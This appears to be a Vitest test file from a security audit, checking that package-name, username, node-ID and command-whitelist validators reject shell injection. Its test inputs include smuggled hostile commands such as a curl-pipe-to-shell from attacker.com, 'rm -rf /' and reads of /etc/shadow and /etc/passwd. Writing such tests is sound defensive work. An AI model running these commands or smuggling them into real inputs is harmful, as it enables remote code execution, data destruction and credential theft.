/**
 * Security Hardening Tests
 *
 * Tests for security fixes identified in the security audit.
 * Covers: shell injection, command whitelist bypass, input validation,
 * sensitive header filtering, and username sanitization.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { sanitizePackageName, sanitizeUsername, PackageNameSchema } from '../../src/validation/commonSchemas';
import { NodeIdParamSchema, NodeParamSchema } from '../../src/validation/commonSchemas';
import { CommandWhitelistService } from '../../src/validation/CommandWhitelistService';
import type { WhitelistConfig } from '../../src/config/schema';
import { PackageManagerDetector } from '../../src/integrations/ssh/PackageManagerDetector';

// ======================================================================
// 1. Package Name Sanitization (Critical: Shell Injection Prevention)
// ======================================================================

describe('sanitizePackageName - shell injection prevention', () => {
  it('should accept valid package names', () => {
    expect(sanitizePackageName('nginx')).toBe('nginx');
    expect(sanitizePackageName('vim')).toBe('vim');
    expect(sanitizePackageName('libssl-dev')).toBe('libssl-dev');
    expect(sanitizePackageName('python3.11')).toBe('python3.11');
    expect(sanitizePackageName('gcc-c++')).toBe('gcc-c++');
    expect(sanitizePackageName('kernel-devel')).toBe('kernel-devel');
    expect(sanitizePackageName('glibc.i686')).toBe('glibc.i686');
    expect(sanitizePackageName('fonts-noto:amd64')).toBe('fonts-noto:amd64');
    expect(sanitizePackageName('libssh~2')).toBe('libssh~2');
  });

  it('should reject shell command injection via semicolon', () => {
    expect(() => sanitizePackageName('vim; rm -rf /')).toThrow('contains characters not allowed');
  });

  it('should reject shell command injection via $()', () => {
    expect(() => sanitizePackageName('$(curl attacker.com/shell.sh | sh)')).toThrow('contains characters not allowed');
  });

  it('should reject shell command injection via backticks', () => {
    expect(() => sanitizePackageName('pkg`whoami`')).toThrow('contains characters not allowed');
  });

  it('should reject shell command injection via pipe', () => {
    expect(() => sanitizePackageName('vim | cat /etc/shadow')).toThrow('contains characters not allowed');
  });

  it('should reject shell command injection via &&', () => {
    expect(() => sanitizePackageName('vim && rm -rf /')).toThrow('contains characters not allowed');
  });

  it('should reject shell redirection', () => {
    expect(() => sanitizePackageName('vim > /dev/null')).toThrow('contains characters not allowed');
    expect(() => sanitizePackageName('vim < /etc/passwd')).toThrow('contains characters not allowed');
  });

  it('should reject newlines in package names', () => {
    expect(() => sanitizePackageName('vim\nrm -rf /')).toThrow('contains characters not allowed');
  });

  it('should reject empty package names', () => {
    expect(() => sanitizePackageName('')).toThrow('cannot be empty');
    expect(() => sanitizePackageName('   ')).toThrow('cannot be empty');
  });

  it('should reject excessively long package names', () => {
    const longName = 'a'.repeat(257);
    expect(() => sanitizePackageName(longName)).toThrow('too long');
  });

  it('should trim whitespace from valid names', () => {
    expect(sanitizePackageName('  nginx  ')).toBe('nginx');
  });

  it('should reject names starting with non-alphanumeric', () => {
    expect(() => sanitizePackageName('-vim')).toThrow('contains characters not allowed');
    expect(() => sanitizePackageName('.vim')).toThrow('contains characters not allowed');
  });
});

describe('PackageNameSchema - Zod integration', () => {
  it('should accept valid package names', () => {
    expect(PackageNameSchema.parse('nginx')).toBe('nginx');
    expect(PackageNameSchema.parse('libssl-dev')).toBe('libssl-dev');
  });

  it('should reject shell injection attempts', () => {
    expect(() => PackageNameSchema.parse('vim; rm -rf /')).toThrow();
    expect(() => PackageNameSchema.parse('$(evil)')).toThrow();
    expect(() => PackageNameSchema.parse('')).toThrow();
  });
});

// ======================================================================
// 2. PackageManagerDetector Defense-in-Depth
// ======================================================================

describe('PackageManagerDetector - defense-in-depth sanitization', () => {
  let detector: PackageManagerDetector;

  beforeEach(() => {
    detector = new PackageManagerDetector();
  });

  it('should generate safe install commands', () => {
    const cmd = detector.getInstallCommand('apt', 'nginx');
    expect(cmd).toBe('apt-get install -y nginx');
  });

  it('should reject malicious package names in install', () => {
    expect(() => detector.getInstallCommand('apt', 'vim; rm -rf /')).toThrow();
  });

  it('should reject malicious package names in remove', () => {
    expect(() => detector.getRemoveCommand('yum', '$(curl evil)')).toThrow();
  });

  it('should reject malicious package names in update', () => {
    expect(() => detector.getUpdateCommand('dnf', 'pkg | cat /etc/shadow')).toThrow();
  });

  it('should generate safe commands for all package managers', () => {
    expect(detector.getInstallCommand('yum', 'httpd')).toBe('yum install -y httpd');
    expect(detector.getInstallCommand('dnf', 'httpd')).toBe('dnf install -y httpd');
    expect(detector.getInstallCommand('zypper', 'nginx')).toBe('zypper install -y nginx');
    expect(detector.getInstallCommand('pacman', 'nginx')).toBe('pacman -S --noconfirm nginx');
  });
});

// ======================================================================
// 3. Username Sanitization (High: sudo injection prevention)
// ======================================================================

describe('sanitizeUsername - sudo injection prevention', () => {
  it('should accept valid Unix usernames', () => {
    expect(sanitizeUsername('www-data')).toBe('www-data');
    expect(sanitizeUsername('nginx')).toBe('nginx');
    expect(sanitizeUsername('_apt')).toBe('_apt');
    expect(sanitizeUsername('user123')).toBe('user123');
  });

  it('should reject usernames with shell metacharacters', () => {
    expect(() => sanitizeUsername('root; cat /etc/shadow')).toThrow('must be a valid Unix username');
  });

  it('should reject usernames with spaces', () => {
    expect(() => sanitizeUsername('root rm')).toThrow('must be a valid Unix username');
  });

  it('should reject uppercase usernames', () => {
    expect(() => sanitizeUsername('Root')).toThrow('must be a valid Unix username');
  });

  it('should reject excessively long usernames', () => {
    const longName = 'a'.repeat(33);
    expect(() => sanitizeUsername(longName)).toThrow('must be a valid Unix username');
  });

  it('should reject usernames starting with a digit', () => {
    expect(() => sanitizeUsername('1user')).toThrow('must be a valid Unix username');
  });

  it('should reject empty usernames', () => {
    expect(() => sanitizeUsername('')).toThrow('must be a valid Unix username');
  });
});

// ======================================================================
// 4. NodeIdParamSchema Format Validation
// ======================================================================

describe('NodeIdParamSchema - format validation', () => {
  it('should accept valid hostnames', () => {
    expect(NodeIdParamSchema.parse({ id: 'web01.example.com' })).toEqual({ id: 'web01.example.com' });
    expect(NodeIdParamSchema.parse({ id: '192.168.1.1' })).toEqual({ id: '192.168.1.1' });
    expect(NodeIdParamSchema.parse({ id: 'ssh://node1' })).toEqual({ id: 'ssh://node1' });
  });

  it('should reject path traversal attempts', () => {
    expect(() => NodeIdParamSchema.parse({ id: '../etc/passwd' })).toThrow();
  });

  it('should reject shell injection in node IDs', () => {
    expect(() => NodeIdParamSchema.parse({ id: 'host;id' })).toThrow();
    expect(() => NodeIdParamSchema.parse({ id: 'host$(whoami)' })).toThrow();
    expect(() => NodeIdParamSchema.parse({ id: 'host | cat' })).toThrow();
  });

  it('should reject excessively long node IDs', () => {
    const longId = 'a'.repeat(254);
    expect(() => NodeIdParamSchema.parse({ id: longId })).toThrow();
  });

  it('should reject empty node IDs', () => {
    expect(() => NodeIdParamSchema.parse({ id: '' })).toThrow();
  });
});

describe('NodeParamSchema - format validation', () => {
  it('should accept valid node IDs', () => {
    expect(NodeParamSchema.parse({ nodeId: 'web01' })).toEqual({ nodeId: 'web01' });
  });

  it('should reject shell injection in node IDs', () => {
    expect(() => NodeParamSchema.parse({ nodeId: 'host;id' })).toThrow();
  });
});

// ======================================================================
// 5. Command Whitelist - Prefix Match Bypass Prevention
// ======================================================================

describe('CommandWhitelistService - shell metacharacter blocking', () => {
  let service: CommandWhitelistService;

  beforeEach(() => {
    const config: WhitelistConfig = {
      allowAll: false,
      whitelist: ['ls', 'pwd', 'cat /var/log'],
      matchMode: 'prefix',
    };
    service = new CommandWhitelistService(config);
  });

  it('should allow legitimate commands', () => {
    expect(service.isCommandAllowed('ls')).toBe(true);
    expect(service.isCommandAllowed('ls -la')).toBe(true);
    expect(service.isCommandAllowed('pwd')).toBe(true);
    expect(service.isCommandAllowed('cat /var/log syslog')).toBe(true);
  });

  it('should reject command chaining via semicolon', () => {
    expect(service.isCommandAllowed('ls; rm -rf /')).toBe(false);
  });

  it('should reject command chaining via pipe', () => {
    expect(service.isCommandAllowed('ls | cat /etc/shadow')).toBe(false);
  });

  it('should reject command chaining via &&', () => {
    expect(service.isCommandAllowed('ls && rm -rf /')).toBe(false);
  });

  it('should reject command chaining via ||', () => {
    expect(service.isCommandAllowed('ls || rm -rf /')).toBe(false);
  });

  it('should reject subshell execution via $()', () => {
    expect(service.isCommandAllowed('ls $(whoami)')).toBe(false);
  });

  it('should reject subshell execution via backticks', () => {
    expect(service.isCommandAllowed('ls `whoami`')).toBe(false);
  });

  it('should reject output redirection', () => {
    expect(service.isCommandAllowed('ls > /tmp/output')).toBe(false);
    expect(service.isCommandAllowed('ls < /etc/passwd')).toBe(false);
  });

  it('should reject newlines in commands', () => {
    expect(service.isCommandAllowed('ls\nrm -rf /')).toBe(false);
  });

  it('should require word boundary in prefix match', () => {
    // "lsblk" should not match whitelist entry "ls"
    // because "ls" + "blk" has no space separator
    expect(service.isCommandAllowed('lsblk')).toBe(false);
  });

  it('should still allow commands that match exactly', () => {
    expect(service.isCommandAllowed('ls')).toBe(true);
    expect(service.isCommandAllowed('pwd')).toBe(true);
  });
});

describe('CommandWhitelistService - allowAll mode still permits shell chars', () => {
  it('should not block shell chars when allowAll is enabled', () => {
    const config: WhitelistConfig = {
      allowAll: true,
      whitelist: [],
      matchMode: 'exact',
    };
    const service = new CommandWhitelistService(config);
    // When allowAll is explicitly enabled, no filtering is applied
    expect(service.isCommandAllowed('ls; echo ok')).toBe(true);
  });
});

describe('CommandWhitelistService - exact mode with shell chars', () => {
  it('should reject commands with shell chars even in exact mode', () => {
    const config: WhitelistConfig = {
      allowAll: false,
      whitelist: ['ls; rm -rf /'], // even if someone mistakenly adds this
      matchMode: 'exact',
    };
    const service = new CommandWhitelistService(config);
    // Shell metacharacter check runs before exact match
    expect(service.isCommandAllowed('ls; rm -rf /')).toBe(false);
  });
});
